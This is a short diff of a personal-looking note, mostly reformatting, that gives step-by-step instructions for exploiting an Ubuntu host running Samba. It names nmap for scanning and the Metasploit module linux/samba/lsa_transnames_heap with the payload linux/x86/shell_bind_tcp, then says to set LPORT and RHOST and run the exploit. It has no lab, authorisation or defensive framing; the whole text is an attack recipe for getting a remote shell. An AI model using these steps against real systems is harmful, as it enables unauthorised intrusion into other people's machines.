@@ -1,9 +1,9 @@
-Using msfconsole & nmap, an Ubuntu machine can be exploited doing the following:
+// Using msfconsole & nmap, an Ubuntu machine can be exploited doing the following:
 
-Use nmap with any flags of your choice, if a machine runs Ubuntu and has Samba running, do the following in msfconsole:
+// Use nmap with any flags of your choice, if a machine runs Ubuntu and has Samba running, do the following in msfconsole:
 
-msf > use linux/samba/lsa_transnames_heap
-msf > set payload linux/x86/shell_bind_tcp
+- use linux/samba/lsa_transnames_heap
+- set payload linux/x86/shell_bind_tcp
 
 Set LPORT and RHOST, then run "exploit".
 
